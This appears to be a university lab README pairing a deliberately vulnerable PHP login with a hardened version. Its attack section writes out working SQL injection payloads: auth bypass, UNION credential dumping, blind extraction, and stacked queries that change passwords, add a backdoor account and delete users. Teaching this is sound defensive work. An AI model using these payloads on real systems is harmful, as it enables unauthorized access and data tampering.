# 💉  Injectra-From-SQL-Injection-Attacks-to-Secure-Systems

> *From exploitation to fortification — a full SQL Injection lifecycle demonstration*

[![PHP](https://img.shields.io/badge/PHP-8.x-777BB4?style=flat-square&logo=php)](https://php.net)
[![MySQL](https://img.shields.io/badge/MySQL-8.x-4479A1?style=flat-square&logo=mysql)](https://mysql.com)
[![XAMPP](https://img.shields.io/badge/XAMPP-Required-FB7A24?style=flat-square)](https://apachefriends.org)
[![License](https://img.shields.io/badge/License-Educational-green?style=flat-square)]()

---

## 👥 Team

| Name | Roll Number |
|------|-------------|
| Mayank Mittal | 2022101094 |
| Aryaman Mahajan | 2022102034 |
| Vansh Motwani | 2022111035 |

---

## 🧩 What Is This?

**Injectra** is a hands-on web security lab that walks through the complete lifecycle of SQL Injection — from crafting attacks on a deliberately vulnerable PHP application, to building a hardened, secure version that blocks every single one of them.

```
vulnerable_app  ──►  exploited  ──►  data extracted  ──►  DB modified  ──►  secure_app
```

Two applications. Same login form. Completely different outcomes.

---

## 📁 Project Structure

```
Injectra/
├── 📂 vulnerable_app/
│   ├── index.php            # Login UI (intentionally vulnerable)
│   ├── authentication.php   # Raw SQL query handler (multi_query)
│   ├── connection.php       # MySQLi connection → lab5 DB
│   └── style.css            # Styling
│
├── 📂 secure_app/
│   ├── index.php            # Login UI (protected)
│   ├── authentication.php   # PDO prepared statements handler
│   ├── connection.php       # PDO connection → lab5_hashed DB
│   └── hash.php             # Bcrypt password hash generator
│
├── 📂 Screenshots/          # Before/after attack evidence
├── 📄 README.md
└── 📄 SECURITY.md
```

---

## ⚙️ Setup & Installation

### Step 1 — Install XAMPP

Download from [apachefriends.org](https://www.apachefriends.org) and start:
- ✅ Apache
- ✅ MySQL

### Step 2 — Place Project Files

```
C:\xampp\htdocs\
├── vulnerable_app\
└── secure_app\
```

### Step 3 — Create Databases

Open **phpMyAdmin** at `http://localhost/phpmyadmin`

#### 🔴 Vulnerable Database (Plaintext Passwords)

```sql
CREATE DATABASE lab5;
USE lab5;

CREATE TABLE users (
    username VARCHAR(50),
    password VARCHAR(50)
);

INSERT INTO users VALUES ('user1', 'pass1');
INSERT INTO users VALUES ('admin', 'admin123');
```

#### 🟢 Secure Database (Hashed Passwords)

```sql
CREATE DATABASE lab5_hashed;
USE lab5_hashed;

CREATE TABLE users (
    username VARCHAR(50) PRIMARY KEY,
    password VARCHAR(255)
);
```

### Step 4 — Generate Hashed Passwords

Visit `http://localhost/secure_app/hash.php` — copy the output hashes and run:

```sql
USE lab5_hashed;
INSERT INTO users VALUES ('user1', '<paste_hash_1_here>');
INSERT INTO users VALUES ('admin', '<paste_hash_2_here>');
```

---

## 🌐 Access the Apps

| App | URL | Status |
|-----|-----|--------|
| 🔴 Vulnerable App | `http://localhost/vulnerable_app/` | Intentionally broken |
| 🟢 Secure App | `http://localhost/secure_app/` | Fully protected |

### 🔑 Test Credentials

| Username | Password |
|----------|----------|
| `user1`  | `pass1`  |
| `admin`  | `admin123` |

---

## 💥 Attack Showcase (Vulnerable App)

> All attacks demonstrated below work **only** on the vulnerable app. They all fail on the secure app.

---

### 🔓 Attack 1 — Authentication Bypass

Exploits the fact that `--` comments out the rest of the SQL query.

**Payload A:**
```
Username: admin'--
Password: (anything)
```
```sql
-- Query formed:
SELECT * FROM users WHERE username='admin'-- ' AND password=''
-- Password check is commented out → login succeeds
```

**Payload B:**
```
Username: ' OR '1'='1' --
Password: (anything)
```
```sql
-- Query formed:
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password=''
-- Always true → returns all rows → login succeeds
```

---

### 📊 Attack 2 — UNION-Based Data Extraction

Appends a second SELECT to dump the entire users table.

**Payload:**
```
Username: ' UNION SELECT username, password FROM users--
Password: (anything)
```
```sql
-- Query formed:
SELECT * FROM users WHERE username=''
UNION SELECT username, password FROM users--
-- All credentials are returned and displayed on screen
```

---

### 🧠 Attack 3 — Blind SQL Injection

No data is returned directly — the attacker infers truth by watching login success/failure.

**Boolean Test:**
```
admin' AND 1=1--   → Login SUCCESS  (condition is TRUE)
admin' AND 1=2--   → Login FAILED   (condition is FALSE)
```

**Password Extraction (character by character):**
```
admin' AND SUBSTRING(password,1,1)='a'--
admin' AND SUBSTRING(password,1,1)='b'--
...repeat until success...
```

---

### 💣 Attack 4 — Database Modification (Stacked Queries)

Uses `;` to terminate the original query and inject a second one.

**UPDATE — Change a password:**
```
admin'; UPDATE users SET password='hacked' WHERE username='admin'--
```
```sql
SELECT * FROM users WHERE username='admin';
UPDATE users SET password='hacked' WHERE username='admin'--
```

**INSERT — Create a backdoor account:**
```
admin'; INSERT INTO users (username, password) VALUES ('attacker','1234')--
```
```sql
SELECT * FROM users WHERE username='admin';
INSERT INTO users (username, password) VALUES ('attacker','1234')--
```

**DELETE — Remove a user:**
```
admin'; DELETE FROM users WHERE username='user1' AND password='pass1'--
```
```sql
SELECT * FROM users WHERE username='admin';
DELETE FROM users WHERE username='user1' AND password='pass1'--
```

---

## 🔐 Secure App — Defense Mechanisms

The secure app uses four layered defenses that collectively block every attack above.

---

### ✅ Defense 1 — Input Validation

```php
// Whitelist: only letters, numbers, underscores allowed in username
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    header("Location: index.php?error=1");
    exit();
}
```

Blocks: `'`, `--`, `#`, `;`, `/* */`, `OR`, `UNION`, and all injection syntax before the query even runs.

---

### ✅ Defense 2 — Prepared Statements (PDO)

```php
// Query structure is fixed BEFORE user input arrives
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

The `?` placeholder is filled in as **pure data**, never as SQL code. Even `admin'--` is treated as a literal string — it cannot break out of quotes or comment anything.

The connection also disables emulated prepares to force real server-side parameterization:
```php
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
```

---

### ✅ Defense 3 — Password Hashing (bcrypt)

```php
// Store:
password_hash("admin123", PASSWORD_DEFAULT);
// → $2y$10$abc... (bcrypt, auto-salted)

// Verify:
password_verify($input_password, $stored_hash);
```

Even if the entire database is leaked, raw passwords **cannot be reversed** from bcrypt hashes. Plaintext password storage (as in the vulnerable app) means a DB leak = full credential exposure.

---

### ✅ Defense 4 — No SQL Error Exposure

```php
try {
    $stmt = $pdo->prepare("...");
} catch (PDOException $e) {
    error_log("Login error: " . $e->getMessage()); // Server log only
    header("Location: index.php?error=1");          // Generic message to user
    exit();
}
```

SQL errors reveal database structure to attackers. The secure app logs errors server-side and shows only a generic "Invalid username or password" message.

---

## ❌ Why All Attacks Fail on the Secure App

| Attack | Blocked By |
|--------|-----------|
| `admin'--` (auth bypass) | Input validation + prepared statements |
| `' OR '1'='1'--` | Input validation rejects `'` character |
| `UNION SELECT ...` | Input validation + prepared statements |
| Blind SQL (`AND 1=1`) | No behavioral difference — no info leaked |
| `'; UPDATE ...` | Prepared statements — `;` is literal data |
| `'; INSERT ...` | Prepared statements — no stacked queries |
| `'; DELETE ...` | Prepared statements — no stacked queries |
| DB leak → passwords exposed | bcrypt hashing — hashes are not reversible |

---

## 🛠️ Technical Stack

| Component | Vulnerable App | Secure App |
|-----------|---------------|------------|
| Query method | `mysqli_multi_query()` | PDO prepared statements |
| Password storage | Plaintext | bcrypt hash |
| Input validation | None | Regex whitelist |
| Error handling | Exposes SQL errors | Generic messages only |
| Database | `lab5` | `lab5_hashed` |

---

## 💡 SQL Comment Cheat Sheet

Attackers use comments to ignore the rest of a query:

| Symbol | Type | Example |
|--------|------|---------|
| `-- ` | Single-line (note trailing space) | `admin'-- ` |
| `#` | MySQL single-line | `' OR 1=1 #` |
| `/* */` | Block comment | `'/* bypass */OR 1=1` |

---

## 🎯 Key Takeaways

- **Root cause of SQLi**: Mixing user input directly into SQL code
- **`--` and `#`** comment out parts of queries, enabling auth bypass
- **UNION** lets attackers append their own SELECT statements
- **Blind SQLi** extracts data using TRUE/FALSE response differences
- **Stacked queries (`;`)** enable UPDATE, INSERT, DELETE attacks
- **Prepared statements** are the definitive fix — input is never executed as SQL
- **bcrypt hashing** protects passwords even after a full database breach
- **Defense in depth**: validation + prepared statements + hashing + error hiding together

---

## 📸 Screenshots Required (for submission)

- [ ] Initial database state (plaintext passwords)
- [ ] Auth bypass — successful login with `admin'--`
- [ ] Auth bypass — successful login with `OR 1=1`
- [ ] UNION injection — all credentials dumped
- [ ] Blind injection — TRUE condition (login success)
- [ ] Blind injection — FALSE condition (login fail)
- [ ] UPDATE attack — before/after DB state
- [ ] INSERT attack — before/after DB state
- [ ] DELETE attack — before/after DB state
- [ ] Hashed password DB (`lab5_hashed`)
- [ ] Secure app — injection attempt rejected

---

## ⚠️ Disclaimer

This project is built strictly for **educational purposes** as part of a university security lab. All attacks are demonstrated in a local, isolated environment with no real users or data. Never use these techniques against systems you do not own or have explicit permission to test.

---

> 🚀 *Injectra — Full injection lifecycle: attack → exploit → defend*
